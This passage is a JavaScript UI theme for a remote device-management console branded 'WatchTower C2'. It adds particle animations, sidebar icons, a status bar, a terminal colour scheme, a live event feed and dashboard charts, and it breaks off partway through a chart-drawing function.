/* ============================================================
   WATCHTOWER C2 - THEME RUNTIME ENGINE
   Particle animation, SVG sidebar icons, operator status bar
   ============================================================ */
(function() {
    'use strict';

    // ========================================
    // SECTION 1: Patch setNightMode inline styles
    // ========================================
    function patchSetNightMode() {
        if (typeof window.setNightMode === 'function') {
            var _orig = window.setNightMode;
            window.setNightMode = function() {
                var result = _orig.apply(this, arguments);
                clearInlineBackground();
                return result;
            };
        }
    }

    function clearInlineBackground() {
        var body = document.getElementById('body') || document.body;
        if (body) { body.style.backgroundColor = ''; }
    }

    // ========================================
    // SECTION 2: Override login page inline styles
    // ========================================
    function overrideLoginStyles() {
        var allInputs = document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"]');
        allInputs.forEach(function(el) {
            if (el.style.backgroundColor && (
                el.style.backgroundColor === 'rgb(255, 248, 204)' ||
                el.style.backgroundColor.toLowerCase() === '#fff8cc'
            )) {
                el.style.backgroundColor = '';
                el.style.color = '';
                el.style.border = '';
            }
        });

        var buttons = document.querySelectorAll('input[type="button"]');
        buttons.forEach(function(el) {
            if (el.style.backgroundColor) {
                el.style.backgroundColor = '';
                el.style.color = '';
                el.style.border = '';
            }
        });

        var faIds = [
            'securityKeyButton', 'smsKeyButton', 'msgKeyButton',
            'emailKeyButton', 'pushKeyButton', 'duoKeyButton',
            'securityKeyButton2', 'smsKeyButton2', 'msgKeyButton2',
            'emailKeyButton2', 'pushKeyButton2', 'duoKeyButton2'
        ];
        faIds.forEach(function(id) {
            var el = document.getElementById(id);
            if (el) {
                el.style.backgroundColor = 'var(--cs-bg-surface)';
                el.style.borderRadius = '6px';
                el.style.boxShadow = '0 2px 8px rgba(0,0,0,0.4)';
            }
        });

        var authStrat = document.getElementById('authStrategies');
        if (authStrat) {
            var imgs = authStrat.querySelectorAll('img');
            imgs.forEach(function(img) {
                if (img.style.backgroundColor === 'white' || img.style.backgroundColor === '#fff') {
                    img.style.backgroundColor = 'var(--cs-bg-surface)';
                }
            });
        }
    }

    // ========================================
    // SECTION 3: Override dynamic JS-generated styles
    // ========================================
    function overrideDynamicStyles() {
        var devs = document.getElementById('devs');
        if (devs && devs.style.color === 'black') { devs.style.color = ''; }

        var hintLink = document.getElementById('showPassHintLink');
        if (hintLink && hintLink.style.backgroundColor) {
            hintLink.style.backgroundColor = '';
        }
    }

    // ========================================
    // SECTION 4: MutationObserver
    // ========================================
    var observer = new MutationObserver(function(mutations) {
        var needsOverride = false;
        for (var i = 0; i < mutations.length; i++) {
            if (mutations[i].addedNodes.length > 0) { needsOverride = true; break; }
        }
        if (needsOverride) { overrideDynamicStyles(); }
    });

    // ========================================
    // SECTION 5: Particle Network Animation (Login Page)
    // ========================================
    function initParticleNetwork() {
        var canvas = document.getElementById('particleCanvas');
        if (!canvas) return;

        var ctx = canvas.getContext('2d');
        var particles = [];
        var mouse = { x: null, y: null };
        var PARTICLE_COUNT = 80;
        var CONNECTION_DIST = 150;
        var MOUSE_DIST = 200;

        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resize();
        window.addEventListener('resize', resize);

        document.addEventListener('mousemove', function(e) {
            mouse.x = e.clientX;
            mouse.y = e.clientY;
        });

        function Particle() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height;
            this.vx = (Math.random() - 0.5) * 0.4;
            this.vy = (Math.random() - 0.5) * 0.4;
            this.radius = Math.random() * 1.5 + 0.5;
            this.opacity = Math.random() * 0.5 + 0.2;
        }

        Particle.prototype.update = function() {
            this.x += this.vx;
            this.y += this.vy;
            if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
            if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
        };

        Particle.prototype.draw = function() {
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
            ctx.fillStyle = 'rgba(0, 212, 255, ' + this.opacity + ')';
            ctx.fill();
        };

        for (var i = 0; i < PARTICLE_COUNT; i++) {
            particles.push(new Particle());
        }

        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            for (var i = 0; i < particles.length; i++) {
                particles[i].update();
                particles[i].draw();

                // Connect particles near each other
                for (var j = i + 1; j < particles.length; j++) {
                    var dx = particles[i].x - particles[j].x;
                    var dy = particles[i].y - particles[j].y;
                    var dist = Math.sqrt(dx * dx + dy * dy);
                    if (dist < CONNECTION_DIST) {
                        var alpha = (1 - dist / CONNECTION_DIST) * 0.15;
                        ctx.beginPath();
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.strokeStyle = 'rgba(0, 212, 255, ' + alpha + ')';
                        ctx.lineWidth = 0.5;
                        ctx.stroke();
                    }
                }

                // Connect to mouse
                if (mouse.x !== null) {
                    var mdx = particles[i].x - mouse.x;
                    var mdy = particles[i].y - mouse.y;
                    var mdist = Math.sqrt(mdx * mdx + mdy * mdy);
                    if (mdist < MOUSE_DIST) {
                        var malpha = (1 - mdist / MOUSE_DIST) * 0.3;
                        ctx.beginPath();
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(mouse.x, mouse.y);
                        ctx.strokeStyle = 'rgba(0, 212, 255, ' + malpha + ')';
                        ctx.lineWidth = 0.8;
                        ctx.stroke();
                    }
                }
            }

            requestAnimationFrame(animate);
        }
        animate();
    }

    // ========================================
    // SECTION 6: Custom SVG Sidebar Icons
    // ========================================
    var sidebarIcons = {
        LeftMenuMyDevices: '<svg viewBox="0 0 64 64" width="40" height="40"><circle cx="32" cy="32" r="24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.3"/><circle cx="32" cy="32" r="16" fill="none" stroke="currentColor" stroke-width="1" stroke-opacity="0.2"/><circle cx="32" cy="32" r="8" fill="none" stroke="currentColor" stroke-width="1" stroke-opacity="0.15"/><circle cx="32" cy="32" r="2.5" fill="currentColor" opacity="0.9"/><line x1="32" y1="8" x2="32" y2="18" stroke="currentColor" stroke-width="1" stroke-opacity="0.3"/><line x1="32" y1="46" x2="32" y2="56" stroke="currentColor" stroke-width="1" stroke-opacity="0.3"/><line x1="8" y1="32" x2="18" y2="32" stroke="currentColor" stroke-width="1" stroke-opacity="0.3"/><line x1="46" y1="32" x2="56" y2="32" stroke="currentColor" stroke-width="1" stroke-opacity="0.3"/><circle cx="24" cy="22" r="2" fill="#00ff41" opacity="0.7"/><circle cx="40" cy="28" r="1.5" fill="#00ff41" opacity="0.5"/><circle cx="36" cy="40" r="1.5" fill="#ff8c00" opacity="0.5"/></svg>',

        LeftMenuMyAccount: '<svg viewBox="0 0 64 64" width="40" height="40"><path d="M32 8 L56 20 L56 44 L32 56 L8 44 L8 20 Z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.4"/><path d="M32 16 L48 24 L48 40 L32 48 L16 40 L16 24 Z" fill="none" stroke="currentColor" stroke-width="1" stroke-opacity="0.2"/><circle cx="32" cy="26" r="6" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.6"/><path d="M22 42 Q22 35 32 34 Q42 35 42 42" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.5"/><line x1="32" y1="3" x2="32" y2="8" stroke="currentColor" stroke-width="1" stroke-opacity="0.2"/><line x1="32" y1="56" x2="32" y2="61" stroke="currentColor" stroke-width="1" stroke-opacity="0.2"/></svg>',

        LeftMenuMyEvents: '<svg viewBox="0 0 64 64" width="40" height="40"><rect x="10" y="14" width="44" height="36" rx="3" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.4"/><line x1="10" y1="24" x2="54" y2="24" stroke="currentColor" stroke-width="1" stroke-opacity="0.3"/><polyline points="18,34 24,30 30,36 38,26 46,32" fill="none" stroke="#00d4ff" stroke-width="1.5" stroke-opacity="0.7"/><circle cx="18" cy="34" r="2" fill="#00d4ff" opacity="0.5"/><circle cx="38" cy="26" r="2" fill="#00ff41" opacity="0.5"/><circle cx="46" cy="32" r="2" fill="#ff8c00" opacity="0.5"/><rect x="14" y="17" width="8" height="4" rx="1" fill="currentColor" opacity="0.2"/><rect x="26" y="17" width="12" height="4" rx="1" fill="currentColor" opacity="0.15"/></svg>',

        LeftMenuMyFiles: '<svg viewBox="0 0 64 64" width="40" height="40"><path d="M12 16 L28 16 L32 22 L52 22 L52 50 L12 50 Z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.4"/><line x1="12" y1="28" x2="52" y2="28" stroke="currentColor" stroke-width="1" stroke-opacity="0.2"/><rect x="22" y="34" width="20" height="2" rx="1" fill="currentColor" opacity="0.2"/><rect x="22" y="40" width="14" height="2" rx="1" fill="currentColor" opacity="0.15"/><circle cx="17" cy="35" r="1.5" fill="#00d4ff" opacity="0.4"/><circle cx="17" cy="41" r="1.5" fill="#00d4ff" opacity="0.4"/></svg>',

        LeftMenuMyUsers: '<svg viewBox="0 0 64 64" width="40" height="40"><circle cx="24" cy="22" r="7" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.5"/><path d="M12 46 Q12 36 24 34 Q36 36 36 46" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.4"/><circle cx="42" cy="24" r="5.5" fill="none" stroke="currentColor" stroke-width="1.2" stroke-opacity="0.35"/><path d="M33 46 Q33 38 42 37 Q51 38 51 46" fill="none" stroke="currentColor" stroke-width="1.2" stroke-opacity="0.3"/><circle cx="24" cy="22" r="2" fill="#00ff41" opacity="0.4"/><circle cx="42" cy="24" r="1.5" fill="#00d4ff" opacity="0.3"/></svg>',

        LeftMenuMyServer: '<svg viewBox="0 0 64 64" width="40" height="40"><rect x="14" y="10" width="36" height="12" rx="2" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.4"/><rect x="14" y="26" width="36" height="12" rx="2" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.4"/><rect x="14" y="42" width="36" height="12" rx="2" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.4"/><circle cx="42" cy="16" r="2" fill="#00ff41" opacity="0.7"/><circle cx="42" cy="32" r="2" fill="#00ff41" opacity="0.7"/><circle cx="42" cy="48" r="2" fill="#ff8c00" opacity="0.5"/><rect x="20" y="14" width="12" height="4" rx="1" fill="currentColor" opacity="0.15"/><rect x="20" y="30" width="12" height="4" rx="1" fill="currentColor" opacity="0.15"/><rect x="20" y="46" width="12" height="4" rx="1" fill="currentColor" opacity="0.15"/></svg>'
    };

    function replaceSidebarIcons() {
        Object.keys(sidebarIcons).forEach(function(id) {
            var btn = document.getElementById(id);
            if (!btn) return;

            // Check if already replaced
            if (btn.getAttribute('data-wt-icon')) return;
            btn.setAttribute('data-wt-icon', 'true');

            // Get the label text from existing content
            var existingImg = btn.querySelector('img');
            var existingText = btn.querySelector('span, div');
            var label = '';
            if (existingText) label = existingText.textContent;

            // Clear existing content and replace with SVG
            btn.innerHTML = '';
            btn.style.display = 'flex';
            btn.style.flexDirection = 'column';
            btn.style.alignItems = 'center';
            btn.style.justifyContent = 'center';
            btn.style.color = '#00d4ff';
            btn.style.padding = '6px';

            var iconWrapper = document.createElement('div');
            iconWrapper.innerHTML = sidebarIcons[id];
            iconWrapper.style.lineHeight = '0';
            btn.appendChild(iconWrapper);

            if (label) {
                var labelEl = document.createElement('div');
                labelEl.textContent = label;
                labelEl.style.fontSize = '8px';
                labelEl.style.marginTop = '3px';
                labelEl.style.color = '#7a8a9a';
                labelEl.style.fontFamily = "'Inter','Segoe UI',sans-serif";
                labelEl.style.letterSpacing = '0.5px';
                btn.appendChild(labelEl);
            }
        });
    }

    // ========================================
    // SECTION 7: Operator Status Bar (Footer)
    // ========================================
    var sessionStartTime = Date.now();

    function enhanceFooter() {
        var footer = document.getElementById('footer');
        if (!footer) return;
        if (footer.getAttribute('data-wt-status')) return;
        footer.setAttribute('data-wt-status', 'true');

        footer.style.borderTop = '1px solid rgba(0, 212, 255, 0.15)';
        footer.style.padding = '0 12px';
        footer.style.display = 'flex';
        footer.style.alignItems = 'center';
        footer.style.justifyContent = 'space-between';
        footer.style.fontFamily = "'JetBrains Mono','Consolas',monospace";
        footer.style.fontSize = '11px';

        // Save original footer content
        var origContent = footer.innerHTML;

        footer.innerHTML = '';

        // Left: Status indicator
        var left = document.createElement('div');
        left.style.display = 'flex';
        left.style.alignItems = 'center';
        left.style.gap = '12px';
        left.innerHTML =
            '<span style="display:flex;align-items:center;gap:4px">' +
                '<span id="wtStatusDot" style="width:6px;height:6px;border-radius:50%;background:#00ff41;box-shadow:0 0 6px rgba(0,255,65,0.5);display:inline-block"></span>' +
                '<span style="color:#7a8a9a">CONNECTED</span>' +
            '</span>' +
            '<span style="color:#2a3a4a">|</span>' +
            '<span style="color:#4a5a6a">SESSION: <span id="wtUptime" style="color:#7a8a9a">00:00:00</span></span>';
        footer.appendChild(left);

        // Center: Original links
        var center = document.createElement('div');
        center.style.color = '#4a5a6a';
        center.innerHTML = origContent;
        footer.appendChild(center);

        // Right: Stats
        var right = document.createElement('div');
        right.style.display = 'flex';
        right.style.alignItems = 'center';
        right.style.gap = '12px';
        right.innerHTML =
            '<span style="color:#4a5a6a">AGENTS: <span id="wtAgentCount" style="color:#00d4ff">0</span></span>' +
            '<span style="color:#2a3a4a">|</span>' +
            '<span style="color:#4a5a6a">USERS: <span id="wtUserCount" style="color:#00d4ff">0</span></span>' +
            '<span style="color:#2a3a4a">|</span>' +
            '<span style="color:#4a5a6a">WATCHTOWER <span style="color:#00d4ff">v1.0</span></span>';
        footer.appendChild(right);

        // Start uptime counter
        setInterval(updateUptime, 1000);
        // Poll stats
        setInterval(updateStatusBar, 5000);
        updateStatusBar();
    }

    function updateUptime() {
        var el = document.getElementById('wtUptime');
        if (!el) return;
        var elapsed = Math.floor((Date.now() - sessionStartTime) / 1000);
        var h = Math.floor(elapsed / 3600);
        var m = Math.floor((elapsed % 3600) / 60);
        var s = elapsed % 60;
        el.textContent = pad(h) + ':' + pad(m) + ':' + pad(s);
    }

    function pad(n) { return n < 10 ? '0' + n : '' + n; }

    function updateStatusBar() {
        // Try to read stats from the page DOM
        var agentEl = document.getElementById('wtAgentCount');
        var userEl = document.getElementById('wtUserCount');
        var dotEl = document.getElementById('wtStatusDot');
        if (!agentEl) return;

        // Check if meshserver object has stats
        if (typeof meshserver !== 'undefined' && meshserver && meshserver.agentStats) {
            agentEl.textContent = meshserver.agentStats.agentCount || '0';
            userEl.textContent = meshserver.agentStats.userCount || '0';
        }

        // Check server state cells for data
        var stateCells = document.querySelectorAll('.serverStateTableCell');
        stateCells.forEach(function(cell) {
            var text = cell.textContent || '';
            var val = cell.nextElementSibling;
            if (!val) return;
            if (text.indexOf('Agent Sessions') >= 0) agentEl.textContent = val.textContent.trim();
            if (text.indexOf('Connected Users') >= 0) userEl.textContent = val.textContent.trim();
        });

        // Also check if server state table exists in p6
        var p6 = document.getElementById('p6');
        if (p6) {
            var tds = p6.querySelectorAll('td');
            for (var i = 0; i < tds.length; i++) {
                var t = tds[i].textContent.trim();
                if (t === 'Agent Sessions' && tds[i+1]) agentEl.textContent = tds[i+1].textContent.trim();
                if (t === 'Connected Users' && tds[i+1]) userEl.textContent = tds[i+1].textContent.trim();
            }
        }

        // Update connection dot
        if (dotEl) {
            var isConnected = !document.getElementById('p0') ||
                              (document.getElementById('p0') && getComputedStyle(document.getElementById('p0')).display === 'none');
            dotEl.style.background = isConnected ? '#00ff41' : '#ff3333';
            dotEl.style.boxShadow = isConnected
                ? '0 0 6px rgba(0,255,65,0.5)'
                : '0 0 6px rgba(255,51,51,0.5)';
            var label = dotEl.nextElementSibling;
            if (label) label.textContent = isConnected ? 'CONNECTED' : 'DISCONNECTED';
        }
    }

    // ========================================
    // SECTION 8: Initialization
    // ========================================
    function init() {
        clearInlineBackground();
        overrideLoginStyles();
        overrideDynamicStyles();

        // Login page specific
        if (document.body.classList.contains('login')) {
            initParticleNetwork();
        }

        // Dashboard specific
        if (!document.body.classList.contains('login')) {
            enhanceFooter();
            replaceSidebarIcons();
        }

        // Start DOM observer
        var target = document.getElementById('column_l') || document.body;
        observer.observe(target, { childList: true, subtree: true });

        // Delayed patch
        setTimeout(function() {
            patchSetNightMode();
            clearInlineBackground();
            replaceSidebarIcons();
        }, 200);

        setTimeout(function() {
            overrideLoginStyles();
            overrideDynamicStyles();
            clearInlineBackground();
            replaceSidebarIcons();
            if (!document.body.classList.contains('login')) {
                enhanceFooter();
            }
        }, 1000);
    }

    // ========================================
    // SECTION 9: Terminal Glow-Up - Theme & Constructor Patch
    // ========================================
    var WT_TERM_THEME = {
        background: '#0a0e14',
        foreground: '#00ff41',
        cursor: '#00ff41',
        cursorAccent: '#0a0e14',
        selectionBackground: 'rgba(0, 212, 255, 0.25)',
        selectionForeground: '#ffffff',
        black: '#0a0e14',
        red: '#ff3333',
        green: '#00ff41',
        yellow: '#ff8c00',
        blue: '#00d4ff',
        magenta: '#a855f7',
        cyan: '#00d4ff',
        white: '#c8d0d8',
        brightBlack: '#4a5a6a',
        brightRed: '#ff6666',
        brightGreen: '#33ff66',
        brightYellow: '#ffaa33',
        brightBlue: '#33ddff',
        brightMagenta: '#bb77ff',
        brightCyan: '#33ddff',
        brightWhite: '#ffffff'
    };

    function patchTerminalConstructor() {
        if (typeof Terminal === 'undefined') {
            setTimeout(patchTerminalConstructor, 300);
            return;
        }
        if (window._wtTermPatched) return;
        window._wtTermPatched = true;

        var _OrigTerminal = Terminal;
        window.Terminal = function(options) {
            options = options || {};
            if (!options.theme) {
                options.theme = WT_TERM_THEME;
            } else {
                var merged = {};
                for (var k in WT_TERM_THEME) merged[k] = WT_TERM_THEME[k];
                for (var k2 in options.theme) merged[k2] = options.theme[k2];
                options.theme = merged;
            }
            if (!options.fontFamily) options.fontFamily = "'JetBrains Mono','Fira Code','Cascadia Code',Consolas,monospace";
            if (!options.fontSize) options.fontSize = 14;
            options.cursorBlink = true;
            options.cursorStyle = 'block';

            var instance = new _OrigTerminal(options);
            wtTrackTerminal(instance);
            return instance;
        };
        window.Terminal.prototype = _OrigTerminal.prototype;
        for (var prop in _OrigTerminal) {
            if (_OrigTerminal.hasOwnProperty(prop)) window.Terminal[prop] = _OrigTerminal[prop];
        }
        window.Terminal.prototype.constructor = window.Terminal;
    }

    // ========================================
    // SECTION 10: Terminal - NEW OUTPUT Badge
    // ========================================
    function wtTrackTerminal(termInstance) {
        var checkOpen = setInterval(function() {
            if (termInstance.element) {
                clearInterval(checkOpen);
                setupTermBadge(termInstance);
            }
        }, 200);
        setTimeout(function() { clearInterval(checkOpen); }, 30000);
    }

    function setupTermBadge(termInstance) {
        var badge = null;
        var outputSinceScroll = 0;

        function isAtBottom() {
            var vp = termInstance.element ? termInstance.element.querySelector('.xterm-viewport') : null;
            if (!vp) return true;
            return vp.scrollTop + vp.clientHeight >= vp.scrollHeight - 10;
        }

        // Listen for scroll to remove badge
        var vp = termInstance.element ? termInstance.element.querySelector('.xterm-viewport') : null;
        if (vp) {
            vp.addEventListener('scroll', function() {
                if (isAtBottom() && badge) {
                    badge.style.display = 'none';
                    outputSinceScroll = 0;
                }
            });
        }

        // Listen for new output
        var handler = termInstance.onLineFeed;
        if (handler) {
            handler.call(termInstance, function() {
                if (!isAtBottom()) {
                    outputSinceScroll++;
                    showTermBadge(termInstance);
                }
            });
        }

        function showTermBadge(term) {
            var container = term.element ? term.element.parentElement : null;
            if (!container) return;
            if (!badge) {
                badge = document.createElement('div');
                badge.className = 'wt-term-new-output';
                badge.onclick = function() {
                    term.scrollToBottom();
                    badge.style.display = 'none';
                    outputSinceScroll = 0;
                };
                container.style.position = 'relative';
                container.appendChild(badge);
            }
            badge.textContent = '▼ NEW OUTPUT (' + outputSinceScroll + ')';
            badge.style.display = '';
        }
    }

    // ========================================
    // SECTION 11: Live Activity Feed - WebSocket Hook
    // ========================================
    var wtFeedItems = [];
    var WT_FEED_MAX = 50;
    var wtFeedCount = 0;

    function hookWebSocket() {
        if (typeof meshserver === 'undefined' || !meshserver || !meshserver.onMessage) {
            setTimeout(hookWebSocket, 500);
            return;
        }
        if (window._wtWsHooked) return;
        window._wtWsHooked = true;

        var _origOnMessage = meshserver.onMessage;
        meshserver.onMessage = function(server, message) {
            wtProcessMessage(message);
            return _origOnMessage.call(this, server, message);
        };
    }

    function getNodeName(nodeid) {
        if (typeof nodes !== 'undefined' && nodes) {
            for (var i = 0; i < nodes.length; i++) {
                if (nodes[i]._id === nodeid) return nodes[i].name;
            }
        }
        return nodeid ? nodeid.split('/').pop().substring(0, 8) : 'Unknown';
    }

    function wtEscapeHtml(str) {
        if (typeof EscapeHtml === 'function') return EscapeHtml(str);
        return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    function wtProcessMessage(message) {
        if (!message || !message.action) return;

        if (message.action === 'event') {
            var evt = message.event;
            if (!evt || evt.nolog) return;

            var feedItem = {
                time: new Date(evt.time || Date.now()),
                id: evt.h || Math.random()
            };

            var act = evt.action || '';
            if (act === 'nodeconnect') {
                var name = getNodeName(evt.nodeid);
                if (evt.conn && evt.conn > 0) {
                    feedItem.type = 'connect';
                    feedItem.msg = name + ' connected';
                    // Inbound check-in beam on globe
                    setTimeout(function() { wtFireGlobeBeam(evt.nodeid, 'in'); }, 300);
                } else {
                    feedItem.type = 'disconnect';
                    feedItem.msg = name + ' disconnected';
                }
            } else if (act === 'agentlog') {
                feedItem.type = 'alert';
                feedItem.msg = evt.msg || 'Agent log entry';
            } else if (act === 'changenode' || act === 'relaylog') {
                feedItem.type = 'info';
                feedItem.msg = evt.msg || 'Device updated';
            } else if (act === 'login' || act === 'accountlogin') {
                feedItem.type = 'connect';
                feedItem.msg = (evt.username || 'User') + ' logged in' + (evt.remoteaddr ? ' from ' + evt.remoteaddr : '');
            } else if (act === 'accountcreate' || act === 'accountchange' || act === 'accountremove') {
                feedItem.type = 'alert';
                feedItem.msg = evt.msg || 'Account change';
            } else if (evt.msg) {
                feedItem.type = 'info';
                feedItem.msg = evt.msg;
            } else {
                return;
            }
            addFeedItem(feedItem);
            wtLogEvent(feedItem.type, feedItem.msg, evt.nodeid || null);
        }
    }

    // ========================================
    // SECTION 12: Live Activity Feed - DOM & Rendering
    // ========================================
    function createActivityFeed() {
        var columnL = document.getElementById('column_l');
        if (!columnL || document.getElementById('wtActivityFeed')) return;

        var feed = document.createElement('div');
        feed.id = 'wtActivityFeed';
        feed.innerHTML =
            '<div class="wt-feed-header">' +
                '<span class="wt-feed-title">' +
                    '<svg viewBox="0 0 16 16" width="12" height="12" style="vertical-align:-1px;margin-right:5px"><circle cx="8" cy="8" r="3" fill="#00ff41"/><circle cx="8" cy="8" r="6" fill="none" stroke="#00ff41" stroke-width="1" opacity="0.4"/></svg>' +
                    'LIVE FEED' +
                '</span>' +
                '<span class="wt-feed-count" id="wtFeedCount">0</span>' +
                '<button id="wtFeedToggle" class="wt-feed-toggle" title="Toggle activity feed">&#9650;</button>' +
            '</div>' +
            '<div class="wt-feed-scroll" id="wtFeedScroll"></div>';

        columnL.insertBefore(feed, columnL.firstChild);

        document.getElementById('wtFeedToggle').addEventListener('click', function() {
            var scroll = document.getElementById('wtFeedScroll');
            var isCollapsed = scroll.style.display === 'none';
            scroll.style.display = isCollapsed ? '' : 'none';
            this.innerHTML = isCollapsed ? '&#9650;' : '&#9660;';
            try { localStorage.setItem('wtFeedCollapsed', isCollapsed ? '0' : '1'); } catch(e) {}
        });

        try {
            if (localStorage.getItem('wtFeedCollapsed') === '1') {
                document.getElementById('wtFeedScroll').style.display = 'none';
                document.getElementById('wtFeedToggle').innerHTML = '&#9660;';
            }
        } catch(e) {}

        // Seed with a startup event
        addFeedItem({ time: new Date(), id: 'init', type: 'info', msg: 'WatchTower operator session initialized' });
    }

    function addFeedItem(item) {
        wtFeedItems.unshift(item);
        if (wtFeedItems.length > WT_FEED_MAX) wtFeedItems.pop();
        wtFeedCount++;
        var countEl = document.getElementById('wtFeedCount');
        if (countEl) countEl.textContent = wtFeedCount;
        renderFeedItem(item);
    }

    function renderFeedItem(item) {
        var container = document.getElementById('wtFeedScroll');
        if (!container) return;

        var el = document.createElement('div');
        el.className = 'wt-feed-item wt-feed-' + item.type;

        var t = item.time;
        var timeStr = pad(t.getHours()) + ':' + pad(t.getMinutes()) + ':' + pad(t.getSeconds());

        el.innerHTML =
            '<span class="wt-feed-time">' + timeStr + '</span>' +
            '<span class="wt-feed-dot"></span>' +
            '<span class="wt-feed-msg">' + wtEscapeHtml(item.msg) + '</span>';

        container.insertBefore(el, container.firstChild);
        while (container.children.length > WT_FEED_MAX) container.removeChild(container.lastChild);

        requestAnimationFrame(function() { el.classList.add('wt-feed-enter'); });
    }

    // ========================================
    // SECTION 13: Tactical Dashboard - Data & Charts
    // ========================================
    var wtDashboardActive = false;
    var wtDashboardTimer = null;

    function collectDashData() {
        var data = { online: 0, offline: 0, total: 0, groups: 0, osDist: {} };
        if (typeof nodes === 'undefined' || !nodes || !nodes.length) return data;
        data.total = nodes.length;
        for (var i = 0; i < nodes.length; i++) {
            var n = nodes[i];
            if (n.conn && n.conn > 0) data.online++; else data.offline++;
            var os = 'Unknown';
            if (n.osdesc) {
                if (n.osdesc.indexOf('Windows') >= 0) os = 'Windows';
                else if (n.osdesc.indexOf('Linux') >= 0) os = 'Linux';
                else if (n.osdesc.indexOf('macOS') >= 0 || n.osdesc.indexOf('Mac OS') >= 0) os = 'macOS';
                else if (n.osdesc.indexOf('FreeBSD') >= 0) os = 'FreeBSD';
                else if (n.osdesc.indexOf('Android') >= 0) os = 'Android';
                else os = 'Other';
            }
            data.osDist[os] = (data.osDist[os] || 0) + 1;
        }
        if (typeof meshes !== 'undefined' && meshes) data.groups = Object.keys(meshes).length;
        return data;
    }

    function drawDonut(canvasId, distData) {
        var canvas = document.getElementById(canvasId);
        if (!canvas) return;
        var ctx = canvas.getContext('2d');
        var w = canvas.width, h = canvas.height, cx = w/2, cy = h/2;
        var outerR = Math.min(w,h)/2 - 10, innerR = outerR * 0.6;
        ctx.clearRect(0, 0, w, h);

        var colors = { Windows:'#00d4ff', Linux:'#00ff41', macOS:'#a855f7', FreeBSD:'#ff8c00', Android:'#ff3333', Other:'#4a5a6a', Unknown:'#2a3a4a' };
        var total = 0, entries = [];
        for (var k in distData) { total += distData[k]; entries.push({name:k, count:distData[k]}); }

        if (total === 0) {
            ctx.beginPath(); ctx.arc(cx,cy,outerR,0,Math.PI*2); ctx.arc(cx,cy,innerR,Math.PI*2,0,true);
            ctx.fillStyle='#1a2028'; ctx.fill();
            ctx.font='12px Inter,sans-serif'; ctx.fillStyle='#4a5a6a'; ctx.textAlign='center'; ctx.textBaseline='middle';
            ctx.fillText('No Data',cx,cy); return;
        }
        entries.sort(function(a,b){return b.count-a.count;});

        var startAngle = -Math.PI/2;
        for (var i = 0; i < entries.length; i++) {
            var sl = entries[i], sliceAngle = (sl.count/total)*Math.PI*2;
            ctx.beginPath(); ctx.arc(cx,cy,outerR,startAngle,startAngle+sliceAngle);
            ctx.arc(cx,cy,innerR,startAngle+sliceAngle,startAngle,true); ctx.closePath();
            ctx.fillStyle = colors[sl.name]||'#4a5a6a'; ctx.fill();
            ctx.strokeStyle='#0a0e14'; ctx.lineWidth=2; ctx.stroke();
            startAngle += sliceAngle;
        }

        ctx.font='bold 22px Inter,sans-serif'; ctx.fillStyle='#c8d0d8'; ctx.textAlign='center'; ctx.textBaseline='middle';
        ctx.fillText(total.toString(), cx, cy-6);
        ctx.font='9px Inter,sans-serif'; ctx.fillStyle='#4a5a6a'; ctx.fillText('AGENTS',cx,cy+10);

        var legend = document.getElementById('wtOsLegend');
        if (legend) {
            var lh = '';
            for (var j = 0; j < entries.length; j++) {
                var e = entries[j], pct = Math.round((e.count/total)*100);
                lh += '<div class="wt-legend-item"><span class="wt-legend-dot" style="background:'+(colors[e.name]||'#4a5a6a')+'"></span><span class="wt-legend-name">'+e.name+'</span><span class="wt-legend-val">'+e.count+' ('+pct+'%)</span></div>';
            }
            legend.innerHTML = lh;
        }
    }

    function drawSparkline(canvasId) {
        var canvas = document.getElementById(canvasId);
        if (!canvas) return;
        var ctx = canvas.getContext('2d');
        var w = canvas.width, h = canvas.height;
        var p = {top:10, right:10, bottom:22, left:35};
        ctx.clearRect(0,0,w,h);

        var now = Date.now(), buckets = new Array(24).fill(0);
        if (typeof events !== 'undefined' && events) {
            for (var i = 0; i < events.length; i++) {
                var et = new Date(events[i].time).getTime();
                var ha = Math.floor((now-et)/3600000);
                if (ha >= 0 && ha < 24) buckets[23-ha]++;
            }
        }

        var maxV = Math.max.apply(null,buckets)||1;
        var cw = w-p.left-p.right, ch = h-p.top-p.bottom, sx = cw/(buckets.length-1);

        // Grid
        ctx.strokeStyle='rgba(42,58,74,0.4)'; ctx.lineWidth=0.5;
        for (var g=0;g<=4;g++){var gy=p.top+(ch*g/4);ctx.beginPath();ctx.moveTo(p.left,gy);ctx.lineTo(w-p.right,gy);ctx.stroke();}

        // Area
        ctx.beginPath(); ctx.moveTo(p.left,p.top+ch);
        for(var b=0;b<buckets.length;b++){var x=p.left+b*sx,y=p.top+ch-(buckets[b]/maxV)*ch;ctx.lineTo(x,y);}
        ctx.lineTo(p.left+(buckets.length-1)*sx,p.top+ch); ctx.closePath();
        var grad=ctx.createLinearGradient(0,p.top,0,p.top+ch);
        grad.addColorStop(0,'rgba(0,212,255,0.15)'); grad.addColorStop(1,'rgba(0,212,255,0.01)');
        ctx.fillStyle=grad; ctx.fill();

        // Line
        ctx.beginPath();
